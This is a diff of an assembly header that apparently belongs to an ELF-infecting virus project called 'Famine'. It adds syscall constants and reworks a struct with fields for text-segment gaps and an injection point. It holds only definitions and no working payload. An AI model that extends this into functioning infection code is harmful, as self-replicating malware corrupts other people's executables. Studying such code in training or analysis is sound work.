@@ -11,6 +11,7 @@
 %define		SYS_MMAP			9
 %define		SYS_EXIT			60
 %define		SYS_GETENTS			78
+%define		SYS_CHMOD			90
 
 
 ; MMAP defines
@@ -25,6 +26,8 @@
 %define		O_RDONLY			0x0000
 %define		O_WRONLY			0x0001
 %define		O_RDWR				0x0002
+%define		O_DIRECTORY			0q0200000
+
 
 
 ; DIRENT defines
@@ -67,11 +70,6 @@ struc	elf64_phdr
 	.p_align:		resq	1
 endstruc
 
-; DIRENT_WRAPPER structure
-struc	dirent_wrapper
-	.total_dreclen	resq	1
-endstruc
-
 ; FAMINE structure
 struc	famine
 	.dirents:		resb	DIRENTS_BUFF_SIZE
@@ -80,9 +78,8 @@ struc	famine
 	.gap_size:		resq	1
 	.txt_offset:	resq	1
 	.txt_filesz:	resq	1
+	.injection_pt:	resq	1
 	.txt_vaddr:		resq	1
-	.next_offset:	resq	1
-	.orig_entry:	resq	1
 	.current_fpath:	resb	PATH_MAX
 endstruc
 
